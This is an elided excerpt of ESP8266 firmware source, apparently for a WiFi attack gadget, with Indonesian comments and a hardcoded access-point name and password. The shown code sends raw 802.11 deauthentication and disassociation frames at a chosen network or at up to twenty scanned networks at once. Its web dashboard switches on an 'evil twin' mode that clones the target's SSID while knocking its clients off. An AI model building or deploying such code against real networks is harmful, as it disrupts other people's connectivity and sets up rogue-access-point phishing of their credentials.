...
void sendDeauth(uint8_t* bssid, uint8_t ch) {
  ...
  wifi_send_pkt_freedom(pkt, 25, 0);
  pkt[0] = 0xA0; wifi_send_pkt_freedom(pkt, 25, 0);
}
...
void handleRoot() {
  ...
  // Dashboard Admin (Fix Style Error)
  ...
  if (webServer.hasArg("act")) {
    ...
    if (a == "evil") { evil_twin = !evil_twin; if(evil_twin && target_id != -1) { WiFi.softAP(_networks[target_id].ssid.c_str()); deauth_target = true; } else { WiFi.softAP("GMpro87_V2", "Sangkur87"); } }
  ...
  // HTML UTAMA (Gue bungkus biar nggak error compile)
...
void loop() {
  ...
  if (millis() - attack_now >= 180) {
    if (deauth_target && target_id != -1) sendDeauth(_networks[target_id].bssid, _networks[target_id].ch);
    if (mass_deauth) { for(int i=0; i<20; i++) if(_networks[i].ch != 0) sendDeauth(_networks[i].bssid, _networks[i].ch); }
    attack_now = millis();
  }
  ...
  if (millis() - scan_now >= 10000 && !deauth_target && !mass_deauth) {
    int n = WiFi.scanNetworks(false, true);
    for (int i=0; i<n && i<20; i++) { _networks[i].ssid=WiFi.SSID(i); _networks[i].ch=WiFi.channel(i); _networks[i].rssi=WiFi.RSSI(i); memcpy(_networks[i].bssid, WiFi.BSSID(i), 6); }
    scan_now = millis();
  }
}
